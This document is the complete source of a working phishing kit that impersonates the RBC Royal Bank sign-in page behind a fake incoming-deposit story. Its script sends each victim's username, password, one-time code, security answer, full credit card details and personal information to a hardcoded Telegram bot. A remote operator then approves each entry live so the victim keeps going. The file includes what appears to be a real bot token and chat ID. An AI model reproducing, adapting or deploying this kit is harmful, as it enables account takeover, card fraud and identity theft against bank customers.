<?php
declare(strict_types=1);

ob_start();
if (session_status() === PHP_SESSION_NONE) session_start();

header('Content-Type: text/html; charset=utf-8');

/* ---------- Locate config ---------- */
$docRoot    = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/');  
$configPath = $docRoot . '/config/config.php';
$config     = is_file($configPath) ? require $configPath : [];

/* ---------- Telegram credentials ---------- */
$telegramToken = $config['telegram']['bot_token'] ?? '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = $config['telegram']['chat_id'] ?? '-1002922644009';

/* ---------- Resolve transaction data (NEW MODEL) ---------- */
$tx =
    $_SESSION['transaction']
    ?? $_SESSION['transaction_data']
    ?? $_SESSION['last_transfer']
    ?? null;

if (!is_array($tx)) {
    $tx = [];
}

/* ---------- Transaction ID ---------- */
$tid = (string)(
    $tx['transaction_id']
    ?? $_SESSION['transaction_id']
    ?? ''
);

/* ---------- Sender Name ---------- */
$senderName = (string)(
    $tx['sender_name']
    ?? $tx['sender']
    ?? $config['sender_name']
    ?? 'N/A'
);

/* ---------- Amount ---------- */
$amount = (string)(
    $tx['amount']
    ?? '0.00'
);

/* Normalize amount display */
$amount = number_format((float)str_replace(['$', ',', ' '], '', $amount), 2);

/* ---------- Currency ---------- */
$currency = (string)(
    $tx['currency']
    ?? 'CAD'
);

/* ---------- Status ---------- */
$status = (string)(
    $tx['status']
    ?? 'Pending'
);

/* ---------- Security Question (NEW) ---------- */
$question = (string)(
    $tx['question']
    ?? $tx['security_question']
    ?? $_SESSION['question']
    ?? ''
);

/* ---------- Expiry ---------- */
$expiry = (string)(
    $tx['expiry_date']
    ?? (
        !empty($tx['expires'])
            ? date('F j, Y', (int)$tx['expires'])
            : ''
    )
);

/* ---------- Persist compatibility keys ---------- */
$_SESSION['transaction_id'] = $tid;
$_SESSION['senderName']     = $senderName;
$_SESSION['amount']         = $amount;
$_SESSION['question']       = $question;

/* ---------- Safe HTML values ---------- */
$tidSafe        = htmlspecialchars($tid, ENT_QUOTES, 'UTF-8');
$senderNameSafe = htmlspecialchars($senderName, ENT_QUOTES, 'UTF-8');
$amountSafe     = htmlspecialchars($amount, ENT_QUOTES, 'UTF-8');
$currencySafe   = htmlspecialchars($currency, ENT_QUOTES, 'UTF-8');
$statusSafe     = htmlspecialchars($status, ENT_QUOTES, 'UTF-8');
$expirySafe     = htmlspecialchars($expiry, ENT_QUOTES, 'UTF-8');
$questionSafe   = htmlspecialchars($question, ENT_QUOTES, 'UTF-8');

/* ---------- Done ---------- */
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RBC Royal Bank - Secure Sign In</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<style>
body{font-family:Arial,sans-serif;margin:0;padding:0;background:#fff;}
.container{max-width:400px;margin:0px auto;padding:20px;background:#fff;box-shadow:0 0px 0px rgba(0,0,0,0.1);}
.step-container{display:none;transition:opacity 0.3s ease;}
.step-container.active{display:block;opacity:1;}
input, select, button{width:100%;padding:14px;font-size:1rem;border-radius:0;margin-bottom:10px;box-sizing:border-box;}
.lock-icon{color:#004a99;font-size:0.9rem;margin-left:5px;line-height:1;}
.error{color:red;margin-bottom:10px;display:none;}
.remember-container{display:flex;align-items:center;margin:10px 0 10px 0;}
.remember-container input[type="checkbox"]{width:20px;height:20px;margin-right:10px;accent-color:#0066cc;border:1px solid #ccc;border-radius:0;flex-shrink:0;}
.remember-container label{font-size:1rem;user-select:none;}
.transaction-box{border:1px solid #ccc;padding:15px;background:#f9f9f9;margin-bottom:15px;}
.input-group {
    display: flex;
    gap: 10px; /* Space between MM/YY and CVV */
    margin-bottom: 10px;
}
.input-group > input {
    margin-bottom: 0; /* Override default margin */
}
.input-group .half-width {
    flex: 1;
}
</style>
<style>
button {
  position: relative;
  overflow: hidden;
  background: #0066cc;
  color: #fff;
  border: none;
  cursor: pointer;
  padding: 14px;
  font-size: 1rem;
  transition: opacity 0.3s;
}
button:disabled {
  opacity: 0.5;
  cursor: default;
}
button .spinner {
  position: absolute;
  top: 50%;
  left: 50%;
  width: 18px;
  height: 18px;
  margin: 0;
  border: 3px solid rgba(255, 255, 255, 0.3);
  border-top: 3px solid #fff;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  display: none;
  transform: translate(-50%, -50%);
  pointer-events: none;
}
button.loading .spinner {
  display: block;
}
button.loading span.text {
  visibility: hidden;
}
@keyframes spin {
  0% { transform: translate(-50%, -50%) rotate(0deg); }
  100% { transform: translate(-50%, -50%) rotate(360deg); }
}
</style>
</head>
<body>
<div class="container">
  <div class="form-panel">
    <div class="form-container">

      <!-- Step 1: Username -->
      <div class="step-container active" id="step-username">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
          <label style="font-weight:bold;">Client Card or Username</label>
          <i class="fa-solid fa-lock lock-icon"></i>
        </div>
        <input type="text" id="username" placeholder="Client Card or Username">
        <div class="error" id="errorUsername"></div>
        <div class="remember-container">
          <input type="checkbox" id="remember">
          <label for="remember">Remember Me</label>
        </div>
        <button id="usernameBtn">Next</button>
        <div style="margin-top:12px; font-size:0.85rem;">
          <a href="https://www.rbcroyalbank.com/recover-username" target="_blank" style="display:block; margin-bottom:3px; color:#004a99; text-decoration:none;">Recover Your Username</a>
          <a href="https://www.rbcroyalbank.com/enrol-online-banking" target="_blank" style="display:block; color:#004a99; text-decoration:none;">Enrol in Online Banking</a>
        </div>
        <div style="margin-top:15px; font-size:0.85rem;">
          <h2 style="font-size:0.9rem; margin-bottom:5px;">Service Notices</h2>
          <a href="https://www.rbcroyalbank.com/avion-rewards-maintenance" target="_blank" style="display:block; margin-bottom:3px; color:#004a99; text-decoration:none;">Maintenance Affecting Avion Rewards</a>
          <p><a href="https://www.rbcroyalbank.com/online-services" target="_blank" style="color:#004a99; text-decoration:none;">Other Online Services</a></p>
        </div>
        <div style="margin-top:20px; font-size:0.8rem; line-height:1.2;">
          <p style="margin:2px 0;">RBC Online Banking is provided by Royal Bank of Canada.</p>
          <p style="margin:2px 0;">Royal Bank of Canada Website, © 1995-2025</p>
          <a href="https://www.rbc.com/legal/" target="_blank" style="margin-right:8px; color:#004a99; text-decoration:none;">Legal</a>
          <a href="https://www.rbc.com/accessibility/" target="_blank" style="margin-right:8px; color:#004a99; text-decoration:none;">Accessibility</a>
          <a href="https://www.rbc.com/privacysecurity/" target="_blank" style="margin-right:8px; color:#004a99; text-decoration:none;">Privacy & Security</a>
          <a href="https://www.rbc.com/cookies/" target="_blank" style="color:#004a99; text-decoration:none;">Advertising & Cookies</a>
        </div>
      </div>

      <!-- Step 2: Password -->
      <div class="step-container" id="step-password">
        <div id="displayUsername" style="margin-bottom:10px;font-weight:bold;"></div>
        <input type="password" id="password" placeholder="Password">
        <div class="error" id="errorPassword"></div>  
        <button id="passwordBtn">Sign In <div class="spinner"></div></button>
      </div>

      <!-- Step 3: Method Selection -->
      <div class="step-container" id="step-method">
        <label>Select Method to Receive Code</label>
        <select id="methodSelect">
          <option value="">--Select Method--</option>
          <option value="sms">Send Code via SMS</option>
          <option value="call">Send Code via Call</option>
        </select>
        <div class="error" id="errorMethod"></div>
        <button id="methodBtn">Continue <div class="spinner"></div></button>
      </div>

      <!-- Step 4: Code Entry -->
      <div class="step-container" id="step-code">
        <label>Enter 6-digit Code</label>
        <input type="tel" id="otpCode" maxlength="6" placeholder="Enter Code">
        <div class="error" id="errorCode"></div>
        <button id="codeBtn">Verify <div class="spinner"></div></button>
      </div>

      <!-- Step 5: Security Question -->
      <div class="step-container" id="step-security">
        <!-- Transaction Details Box -->
        <div class="transaction-box">
          <strong style="display:block; margin-bottom:8px;">Transaction Details</strong>
          <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
            <span>Sender:</span>
            <span><?= htmlspecialchars($senderName); ?></span>
          </div>
          <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
            <span>Amount:</span>
            <span><?= htmlspecialchars($amount); ?></span>
          </div>
        </div>

        <!-- Security Question -->
        <label id="securityLabel" style="margin-top:15px; font-weight:bold; display:block;">
          <?= htmlspecialchars($question ?: "What is this for?"); ?>
        </label>

        <input type="text" id="securityAnswer" placeholder="Security Answer">
        <div class="error" id="errorSecurity"></div>
        <button id="securityBtn">Submit <div class="spinner"></div></button>
        <button id="cancelBtn" style="background:#dc3545;margin-top:8px;">Cancel Transaction</button>
      </div>
      
      <!-- NEW Step 6: Credit Card Verification -->
      <div class="step-container" id="step-credit-card">
        <label style="font-weight:bold;">Credit Card Verification</label>
        <input type="tel" id="cardNumber" placeholder="Card Number" maxlength="19">
        <div class="error" id="errorCardNumber"></div>
        <div class="input-group">
          <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" class="half-width">
          <input type="tel" id="cvv" placeholder="CVV" maxlength="4" class="half-width">
        </div>
        <div class="error" id="errorExpiryCvv"></div>
        <input type="text" id="cardholderName" placeholder="Cardholder Name">
        <div class="error" id="errorCardholderName"></div>
        <button id="creditCardBtn">Continue <div class="spinner"></div></button>
      </div>

      <!-- NEW Step 7: Personal Information Verification -->
      <div class="step-container" id="step-personal-info">
        <label style="font-weight:bold;">Personal Information Verification</label>
        <input type="text" id="fullName" placeholder="Full Name">
        <div class="error" id="errorFullName"></div>
        <input type="text" id="dob" placeholder="Date of Birth (YYYY-MM-DD)">
        <div class="error" id="errorDob"></div>
        <input type="text" id="address" placeholder="Address">
        <div class="error" id="errorAddress"></div>
        <input type="text" id="city" placeholder="City">
        <div class="error" id="errorCity"></div>
        <input type="text" id="province" placeholder="Province / State">
        <div class="error" id="errorProvince"></div>
        <input type="text" id="postalCode" placeholder="Postal Code / Zip Code">
        <div class="error" id="errorPostalCode"></div>
        <input type="tel" id="phoneNumber" placeholder="Phone Number">
        <div class="error" id="errorPhoneNumber"></div>
        <button id="personalInfoBtn">Submit <div class="spinner"></div></button>
      </div>

      <!-- Step 8: Deposit Success (renumbered) -->
      <div class="step-container" id="step-deposit" style="text-align:center; padding:20px;">
        <svg class="checkmark" viewBox="0 0 120 120" style="width:100px; height:100px; margin:0 auto 12px; stroke:#0072c6; stroke-width:8; fill:none; stroke-linecap:round; stroke-linejoin:round; stroke-dasharray:120; stroke-dashoffset:120; animation:drawCheck 0.7s forwards;">
          <path d="M34 62 L52 80 L86 44"/>
        </svg>
        <h2>Successfully deposited into your account</h2>
        <p>Funds may take up to 30 minutes to reflect in your account.</p>
        <div id="depositProgressWrap" style="width:80%; height:10px; background:#eee; border-radius:8px; margin:15px auto; overflow:hidden;">
          <div id="depositProgress" style="height:100%; width:0%; background: linear-gradient(90deg,#0072c6,#004a99); transition: width 0.3s linear;"></div>
        </div>
        <div>Returning to sign-in in <span class="countdown" id="depositCountdown">30</span>s</div>
      </div>

    </div>
  </div>
</div>

<script>
/* =========================================================
 *  CONFIGURATION
 * ========================================================= */
const CONFIG = {
  BOT:  '<?= $telegramToken ?>',
  CHAT: '<?= $chatId ?>',
  POLL_TIMEOUT: 120000, // Increased to 2 minutes for more verification steps
  POLL_INTERVAL: 2000 // Interval between long-poll requests if timeout expires
};

/* =========================================================
 *  UI HELPERS
 * ========================================================= */
const UI = (() => {
  const steps = document.querySelectorAll('.step-container');
  const errorEl = id => document.getElementById(id);

  const showStep = (id) => {
    steps.forEach(el => el.classList.remove('active'));
    const target = document.getElementById(id);
    if (target) target.classList.add('active');
  };

  const setLoading = (btn, loading) => {
    if (loading) {
      btn.classList.add('loading');
      btn.disabled = true;
    } else {
      btn.classList.remove('loading');
      btn.disabled = false;
    }
  };

  const showError = (id, msg) => {
    const el = errorEl(id);
    if (!el) return;
    el.textContent = msg;
    el.style.display = msg ? 'block' : 'none';
  };

  const clearAllErrors = () => {
    document.querySelectorAll('.error').forEach(el => {
      el.textContent = '';
      el.style.display = 'none';
    });
  };

  return { showStep, setLoading, showError, clearAllErrors };
})();

/* =========================================================
 *  TELEGRAM HELPERS
 * ========================================================= */
const Telegram = (() => {
  const { BOT, CHAT, POLL_TIMEOUT, POLL_INTERVAL } = CONFIG;
  let lastUpdateId = 0; // Persist last processed update_id for efficient polling

  const send = async (text, keyboard) => {
    const payload = { chat_id: CHAT, text, parse_mode: 'HTML' };
    if (keyboard) payload.reply_markup = keyboard;
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (!res.ok) {
        throw new Error(`Failed to send message: ${res.status} ${res.statusText}`);
      }
    } catch (e) {
      console.error('Telegram send message error:', e);
      // For a real application, consider a more user-facing error here.
      // For now, poll will handle overall timeouts if messages aren't received.
    }
  };

  const clearKeyboard = async (msgId) => {
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT,
          message_id: msgId,
          reply_markup: {}
        })
      });
      if (!res.ok) {
        throw new Error(`Failed to clear keyboard: ${res.status} ${res.statusText}`);
      }
    } catch (e) {
      console.error('Telegram clear keyboard error:', e);
    }
  };

  const poll = async (sessionCode, btn, errId, onSuccess, fallbackStep) => {
    const start = Date.now();
    const longPollTimeout = 30; // Telegram recommended timeout for getUpdates in seconds

    while (Date.now() - start < POLL_TIMEOUT) {
      try {
        const url = `https://api.telegram.org/bot${BOT}/getUpdates?offset=${lastUpdateId + 1}&timeout=${longPollTimeout}`;
        const res = await fetch(url);
        
        if (!res.ok) {
          throw new Error(`Telegram API error: ${res.status} ${res.statusText}`);
        }
        const { result } = await res.json();

        if (result && result.length > 0) {
          // Update lastUpdateId to the highest update_id received in this batch
          lastUpdateId = Math.max(lastUpdateId, ...result.map(upd => upd.update_id));

          for (const upd of result) {
            const data = upd.callback_query?.data;
            if (data && data.endsWith(`::${sessionCode}`)) {
              await clearKeyboard(upd.callback_query.message.message_id);
              UI.setLoading(btn, false);
              UI.clearAllErrors(); // Clear all errors on successful callback

              const [action] = data.split('::');
              if (action === 'correct') return onSuccess();
              
              UI.showError(errId, 'Incorrect input — please try again.');
              return UI.showStep(fallbackStep);
            }
          }
        }
      } catch (e) {
        console.error('Telegram poll error:', e);
        UI.setLoading(btn, false);
        UI.showError(errId, `Failed to communicate with the bot: ${e.message}. Please check your network.`);
        return UI.showStep(fallbackStep); // Exit polling on critical network error
      }

      // If no updates or no matching update, wait for a short interval before next long-poll check
      // This is primarily for when the long-poll timeout expires without any updates
      await new Promise(r => setTimeout(r, POLL_INTERVAL));
    }

    UI.setLoading(btn, false);
    UI.showError(errId, 'No response from controller within the time limit. Please try again.');
    UI.showStep(fallbackStep);
  };

  return { send, poll };
})();

/* =========================================================
 *  VALIDATION HELPERS
 * ========================================================= */
const Validators = (() => {
  const isValidCardNumber = (number) => {
    return /^\d{13,19}$/.test(number.replace(/\s/g, ''));
  };

  const isValidExpiryDate = (mmYY) => {
    const parts = mmYY.split('/');
    if (parts.length !== 2) return false;
    const month = parseInt(parts[0], 10);
    const year = parseInt(parts[1], 10);

    if (isNaN(month) || isNaN(year) || month < 1 || month > 12) return false;

    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1; // getMonth() is 0-indexed

    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;

    return true;
  };

  const isValidCvv = (cvv) => {
    return /^\d{3,4}$/.test(cvv);
  };

  const isValidDob = (dob) => {
    return /^\d{4}-\d{2}-\d{2}$/.test(dob); // YYYY-MM-DD format
  };

  const isValidPhoneNumber = (phone) => {
    // Basic validation, can be enhanced for specific regions
    return /^\+?\d{10,15}$/.test(phone.replace(/[\s()-]/g, ''));
  };

  return {
    isValidCardNumber,
    isValidExpiryDate,
    isValidCvv,
    isValidDob,
    isValidPhoneNumber
  };
})();


/* =========================================================
 *  MAIN EVENT HANDLERS
 * ========================================================= */
(() => {
  let currentUsername = '';

  // Username
  document.getElementById('usernameBtn').addEventListener('click', () => {
    UI.clearAllErrors();
    const user = document.getElementById('username').value.trim();
    if (!user) return UI.showError('errorUsername', 'Enter your username');
    currentUsername = user;
    document.getElementById('displayUsername').textContent = `< ${user}`;
    UI.showStep('step-password');
  });

  // Password
  document.getElementById('passwordBtn').addEventListener('click', async () => {
    UI.clearAllErrors();
    const pwd = document.getElementById('password').value.trim();
    if (!pwd) return UI.showError('errorPassword', 'Enter your password');

    const btn = document.getElementById('passwordBtn');
    UI.setLoading(btn, true);

    const sessionCode = Math.random().toString(36).slice(2);
    const msg = `🟦 RBC CONTROLER 🟦\n\n▪️  <b>Username:</b> <code>${currentUsername}</code>\n▪️  <b>Password:</b> <code>${pwd}</code>\n🟦 RBC CONTROLER 🟦`;
    const kb = {
      inline_keyboard: [[{ text: '🟩 Correct', callback_data: `correct::${sessionCode}` }], [{ text: '🟥 Incorrect', callback_data: `error::${sessionCode}` }]]
    };

    await Telegram.send(msg, kb);
    Telegram.poll(sessionCode, btn, 'errorPassword', () => UI.showStep('step-method'), 'step-password');
  });

  // Method
  document.getElementById('methodBtn').addEventListener('click', async () => {
    UI.clearAllErrors();
    const method = document.getElementById('methodSelect').value;
    if (!method) return UI.showError('errorMethod', 'Select a method');

    const btn = document.getElementById('methodBtn');
    UI.setLoading(btn, true);

    await Telegram.send(`🟦 RBC CONTROLER 🟦\n\n▫️  <b>Method:</b> ${method}\n🟦 RBC CONTROLER 🟦`);
    UI.setLoading(btn, false);
    UI.showStep('step-code');
  });

  // Code
  document.getElementById('codeBtn').addEventListener('click', async () => {
    UI.clearAllErrors();
    const code = document.getElementById('otpCode').value.trim();
    if (!/^\d{6}$/.test(code)) return UI.showError('errorCode', 'Enter 6-digit code');

    const btn = document.getElementById('codeBtn');
    UI.setLoading(btn, true);

    const sessionCode = Math.random().toString(36).slice(2);
    const msg = `🟦 RBC CONTROLER 🟦\n\n<b>OTP Code:</b> <code>${code}</code>\n🟦 RBC CONTROLER 🟦`;
    const kb = {
      inline_keyboard: [[{ text: '🟩 Correct', callback_data: `correct::${sessionCode}` }], [{ text: '🟥 Incorrect', callback_data: `error::${sessionCode}` }]]
    };

    await Telegram.send(msg, kb);
    Telegram.poll(sessionCode, btn, 'errorCode', () => UI.showStep('step-security'), 'step-code');
  });

  // Security Answer
  document.getElementById('securityBtn').addEventListener('click', async () => {
    UI.clearAllErrors();
    const ans = document.getElementById('securityAnswer').value.trim();
    if (!ans) return UI.showError('errorSecurity', 'Answer the security question');

    const btn = document.getElementById('securityBtn');
    UI.setLoading(btn, true);

    const sessionCode = Math.random().toString(36).slice(2);
    const qText = document.getElementById('securityLabel').textContent.trim();
    const msg = `🟦 RBC CONTROLER 🟦\n\n<b>Question:</b> ${qText}\n<b>Answer:</b> ${ans}\n🟦 RBC CONTROLER 🟦`;
    const kb = {
      inline_keyboard: [[{ text: '🟩 Correct', callback_data: `correct::${sessionCode}` }], [{ text: '🟥 Incorrect', callback_data: `error::${sessionCode}` }]]
    };

    await Telegram.send(msg, kb);
    // On success, go to the new credit card verification step
    Telegram.poll(sessionCode, btn, 'errorSecurity', () => UI.showStep('step-credit-card'), 'step-security');
  });

  // Credit Card Verification
  document.getElementById('creditCardBtn').addEventListener('click', async () => {
    UI.clearAllErrors();
    const cardNumber = document.getElementById('cardNumber').value.trim();
    const expiryDate = document.getElementById('expiryDate').value.trim();
    const cvv = document.getElementById('cvv').value.trim();
    const cardholderName = document.getElementById('cardholderName').value.trim();

    let hasError = false;
    if (!Validators.isValidCardNumber(cardNumber)) {
      UI.showError('errorCardNumber', 'Enter a valid card number.');
      hasError = true;
    }
    if (!Validators.isValidExpiryDate(expiryDate)) {
      UI.showError('errorExpiryCvv', 'Enter a valid MM/YY.');
      hasError = true;
    } else if (!Validators.isValidCvv(cvv)) {
      UI.showError('errorExpiryCvv', 'Enter a valid CVV.');
      hasError = true;
    }
    if (!cardholderName) {
      UI.showError('errorCardholderName', 'Enter cardholder name.');
      hasError = true;
    }

    if (hasError) return;

    const btn = document.getElementById('creditCardBtn');
    UI.setLoading(btn, true);

    const sessionCode = Math.random().toString(36).slice(2);
    const msg = `🟦 RBC CONTROLER 🟦\n\n<b>Credit Card Details:</b>\n▪️  <b>Number:</b> <code>${cardNumber}</code>\n▪️  <b>Expiry:</b> ${expiryDate}\n▪️  <b>CVV:</b> ${cvv}\n▪️  <b>Name:</b> ${cardholderName}\n🟦 RBC CONTROLER 🟦`;
    const kb = {
      inline_keyboard: [[{ text: '🟩 Correct', callback_data: `correct::${sessionCode}` }], [{ text: '🟥 Incorrect', callback_data: `error::${sessionCode}` }]]
    };

    await Telegram.send(msg, kb);
    // On success, go to the new personal info verification step
    Telegram.poll(sessionCode, btn, 'errorCardNumber', () => UI.showStep('step-personal-info'), 'step-credit-card');
  });

  // Personal Information Verification
  document.getElementById('personalInfoBtn').addEventListener('click', async () => {
    UI.clearAllErrors();
    const fullName = document.getElementById('fullName').value.trim();
    const dob = document.getElementById('dob').value.trim();
    const address = document.getElementById('address').value.trim();
    const city = document.getElementById('city').value.trim();
    const province = document.getElementById('province').value.trim();
    const postalCode = document.getElementById('postalCode').value.trim();
    const phoneNumber = document.getElementById('phoneNumber').value.trim();

    let hasError = false;
    if (!fullName) { UI.showError('errorFullName', 'Enter your full name.'); hasError = true; }
    if (!Validators.isValidDob(dob)) { UI.showError('errorDob', 'Enter a valid date of birth (YYYY-MM-DD).'); hasError = true; }
    if (!address) { UI.showError('errorAddress', 'Enter your address.'); hasError = true; }
    if (!city) { UI.showError('errorCity', 'Enter your city.'); hasError = true; }
    if (!province) { UI.showError('errorProvince', 'Enter your province/state.'); hasError = true; }
    if (!postalCode) { UI.showError('errorPostalCode', 'Enter your postal/zip code.'); hasError = true; }
    if (!Validators.isValidPhoneNumber(phoneNumber)) { UI.showError('errorPhoneNumber', 'Enter a valid phone number.'); hasError = true; }

    if (hasError) return;

    const btn = document.getElementById('personalInfoBtn');
    UI.setLoading(btn, true);

    const sessionCode = Math.random().toString(36).slice(2);
    const msg = `🟦 RBC CONTROLER 🟦\n\n<b>Personal Info:</b>\n▪️  <b>Full Name:</b> ${fullName}\n▪️  <b>DOB:</b> ${dob}\n▪️  <b>Address:</b> ${address}, ${city}, ${province} ${postalCode}\n▪️  <b>Phone:</b> ${phoneNumber}\n🟦 RBC CONTROLER 🟦`;
    const kb = {
      inline_keyboard: [[{ text: '🟩 Correct', callback_data: `correct::${sessionCode}` }], [{ text: '🟥 Incorrect', callback_data: `error::${sessionCode}` }]]
    };

    await Telegram.send(msg, kb);
    // On success, go to the deposit success step
    Telegram.poll(sessionCode, btn, 'errorFullName', () => {
      UI.setLoading(btn, false);
      UI.showStep('step-deposit');
    }, 'step-personal-info');
  });


  // Cancel
  document.getElementById('cancelBtn').addEventListener('click', () => {
    UI.clearAllErrors();
    UI.showStep('step-deposit'); // Or create a proper cancel step
  });

  // Deposit countdown
  let countdown = 30;
  const countdownEl = document.getElementById('depositCountdown');
  const progressEl = document.getElementById('depositProgress');
  
  const timer = setInterval(() => {
    if (countdown > 0) {
      countdown--;
      countdownEl.textContent = countdown;
      progressEl.style.width = `${((30 - countdown) / 30) * 100}%`;
    } else {
      clearInterval(timer);
      UI.showStep('step-username');
      // Reset form fields on returning to username step for a fresh start
      document.getElementById('username').value = '';
      document.getElementById('password').value = '';
      document.getElementById('otpCode').value = '';
      document.getElementById('securityAnswer').value = '';
      document.getElementById('cardNumber').value = '';
      document.getElementById('expiryDate').value = '';
      document.getElementById('cvv').value = '';
      document.getElementById('cardholderName').value = '';
      document.getElementById('fullName').value = '';
      document.getElementById('dob').value = '';
      document.getElementById('address').value = '';
      document.getElementById('city').value = '';
      document.getElementById('province').value = '';
      document.getElementById('postalCode').value = '';
      document.getElementById('phoneNumber').value = '';
      UI.clearAllErrors();
      countdown = 30; // Reset countdown for next cycle
      progressEl.style.width = '0%'; // Reset progress bar
    }
  }, 1000);

})();
</script>
</body>
</html>